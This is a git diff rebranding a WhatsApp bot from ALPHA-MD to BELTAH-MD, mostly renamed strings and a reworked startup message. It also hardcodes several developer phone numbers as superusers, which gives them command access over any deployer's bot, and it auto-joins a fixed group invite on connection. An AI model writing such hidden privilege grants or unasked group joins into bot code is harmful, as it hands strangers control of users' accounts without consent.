@@ -63,7 +63,7 @@ const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd
 const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
 //const //{loadCmd}=require("/keizzah/mesfonctions")
 let { reagir } = require(__dirname + "/keizzah/app");
-var session = conf.session.replace(/ALPHA-MD;;;=>/g,"");
+var session = conf.session.replace(/BELTAH-MD;;;=>/g,"");
 const prefixe = conf.PREFIXE;
 const express = require("express");
 const app = express();
@@ -103,7 +103,7 @@ setTimeout(() => {
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['Alpha-Md', "safari", "1.0.0"],
+            browser: ['BELTAH-MD', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -190,10 +190,10 @@ zk.ev.on('call', async (callData) => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const keith = '254748387615';
-            const Keithkeizzah = '254796299159';
-            const Ghost = "254110190196";
-            const Sams = '254743995989';
+            const keith = '254737681758';
+            const Keithkeizzah = '254114141192';
+            const Ghost = "254737681758";
+            const Sams = '254114141192';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, keith, Keithkeizzah, Ghost, Sams, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -201,7 +201,7 @@ zk.ev.on('call', async (callData) => {
             
             var dev = [keith, Keithkeizzah,Ghost,Sams].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t [][]...{ALPHA-MD}...[][]");
+            console.log("\t [][]...{BELTAH-MD}...[][]");
             console.log("=========== New message ===========");
             if (verifGroupe) {
                 console.log("message from the group : " + nomGroupe);
@@ -584,7 +584,7 @@ function mybotpic() {
                          /******************* PM_PERMT***************/
 
             if (!superUser && origineMessage === auteurMessage&& conf.PM_PERMIT === "yes" ) {
-                repondre("You don't have acces to commands here") ; return }
+                repondre("BELTAH-MD DENIED YOUR ACCESS") ; return }
             ///////////////////////////////
 
              
@@ -644,7 +644,7 @@ zk.ev.on('group-participants.update', async (group) => {
         const metadata = await zk.groupMetadata(group.id);
 
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
-            let msg = `╭═══◇KEITH-TECH◇═══⊷
+            let msg = `╭═══◇𝗕𝗘𝗟𝗧𝗔𝗛-𝗠𝗗◇═══⊷
 `;
              
             let membres = group.participants;
@@ -787,10 +787,10 @@ ${metadata.desc}`;
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ Alpha is connecting to your account...");
+                console.log("ℹ️ BELTAH MD is connecting to your account...");
             }
             else if (connection === 'open') {
-                await zk.groupAcceptInvite("KOvNtZbE3JC32oGAe6BQpp");
+                await zk.groupAcceptInvite("CtmozQc8RVv6bLiWK1ACkN");
 
                 console.log("✅ connected successfully enjoy☺️");
                 console.log("--");
@@ -852,19 +852,17 @@ ${metadata.desc}`;
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
                 let cmsg = `Hello👋  *${conf.OWNER_NAME}*  😎 ,
-                 *${getGreeting()},*
-                 *It's ${formattedDate} 🗓️*
-                 *the time is ${formattedTime}.🕛*      
+                 *${getGreeting()},      
  ╭════⊷         
 ║ *『 ${conf.BOT} 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞』*
-║    Prefix : [ ${prefixe} ]
-║    Mode :${md}
-║    Total Commands : ${evt.cm.length}︎
+║    Prefix 🫧 : [ ${prefixe} ]
+║    Mode ⚙️:${md}
+║    Time 🕐: ${formattedTime}
+║    Day 📆: ${formattedDate} 
+║    Commands 🚦: ${evt.cm.length}︎
 ╰═════════════════⊷
 
 ╭───◇
-┃ 
-┃
 ┃ *Thank you for choosing*                      
 ┃  *${conf.BOT}*
 ┃
